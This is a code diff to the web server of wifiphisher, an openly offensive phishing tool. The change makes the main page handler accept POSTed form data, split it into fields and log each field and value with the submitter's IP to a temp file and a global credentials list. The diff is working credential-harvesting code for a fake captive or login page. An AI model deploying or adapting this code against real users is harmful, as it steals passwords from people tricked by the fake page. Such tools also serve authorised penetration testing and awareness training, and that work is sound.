@@ -48,37 +48,30 @@ class ShowPhishingPageHandler(tornado.web.RequestHandler):
         except:
             pass
 
-
-class ReceiveCredsHandler(tornado.web.RequestHandler):
-
-    def post(self):
-        self.redirect("/loading")
-        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-        with open(wifi_webserver_tmp, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
-                           T + self.request.remote_ip + " " +
-                           R + repr(self.request.body) +
-                           W + "\n"
-                           )
-            log_file.close()
+    def post(self, url):
+        formData = self.request.body.split('&')
+        formValues = []
+        for i in formData:
+            formValues.append(i.split('='))
+        for i,x in formValues:
+            with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
+                log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T + 
+                               self.request.remote_ip + W + " input[" + G + 
+                               i + W + "] = " + 
+                               R + x + W + 
+                               "\n")
+                log_file.close()
         global terminate, creds
-        creds.insert(0, repr(self.request.body))
+        for i,x in formValues:
+            creds.insert(0, repr(i + " = " + x))
         terminate = True
 
-
-class ShowLoadingPageHandler(tornado.web.RequestHandler):
-
-    def get(self):
-        self.render("loading.html", **template.get_context())
-
-
+        
 def runHTTPServer(ip, port, ssl_port, t):
     global template
     template = t
     app = tornado.web.Application(
         [
-            (r"/post", ReceiveCredsHandler),
-            (r"/loading", ShowLoadingPageHandler),
             (r"/(.*)", ShowPhishingPageHandler)
         ],
         template_path=template.get_path(),
